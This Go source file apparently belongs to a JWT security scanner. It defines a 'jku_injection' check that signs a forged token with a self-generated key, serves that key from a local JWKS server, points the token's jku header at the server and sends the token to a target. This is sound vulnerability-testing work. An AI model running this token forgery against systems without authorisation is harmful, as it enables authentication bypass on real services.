package jkuinjection

import (
	"context"
	_ "embed"

	"github.com/cerberauth/harnessx"
	"github.com/cerberauth/harnessx/checkdef"
	jwtpkg "github.com/cerberauth/jwtop/jwt"
	"github.com/cerberauth/jwtop/jwt/crack/checkbase"
	"github.com/cerberauth/jwtop/jwt/exploit"
)

//go:embed check.yaml
var checkYAML []byte

var Def = checkdef.MustParseCheckDefYAML("jku_injection", checkYAML)

var Check = checkdef.NewCheck(Def, run, checkdef.WithSkip(harnessx.SkipWhen(skip)))

// skip requires pctx.JKUServerAddr — an address the *target server* can
// reach, not merely one jwtop can bind to (127.0.0.1 only works when the
// target runs on the same host as jwtop). See checkbase.ProbeCtx's doc
// comment on JKUServerAddr for the full requirement and how the resulting
// local JWKS server is addressed.
func skip(_ context.Context, target harnessx.Target, _ harnessx.ResultStore) string {
	pctx := target.Data.(*checkbase.ProbeCtx)
	if pctx.Offline {
		return "requires live server (server-side jku fetch)"
	}
	if !pctx.IsAsymmetric {
		return "jku injection not applicable for " + pctx.Alg
	}
	if pctx.JKUServerAddr == "" {
		return "no JKU callback address configured (set JKUServerAddr to an address the target can reach)"
	}
	return ""
}

// run generates a self-signed key, spins up a local JWKS server advertising
// it, points the token's jku header at that server, and probes the target.
// The server is closed once the probe request has completed.
func run(ctx context.Context, target harnessx.Target, store harnessx.ResultStore) (harnessx.Result, error) {
	pctx := target.Data.(*checkbase.ProbeCtx)

	method, err := jwtpkg.ParseSigningMethod(pctx.Alg)
	if err != nil {
		return checkbase.SendToken(ctx, target, store, "", err)
	}

	token, srv, err := exploit.JKUInjectionWithLocalServer(pctx.TokenString, method, pctx.JKUServerAddr)
	if err != nil {
		return checkbase.SendToken(ctx, target, store, "", err)
	}
	defer srv.Close() //nolint:errcheck

	return checkbase.SendToken(ctx, target, store, token, nil)
}
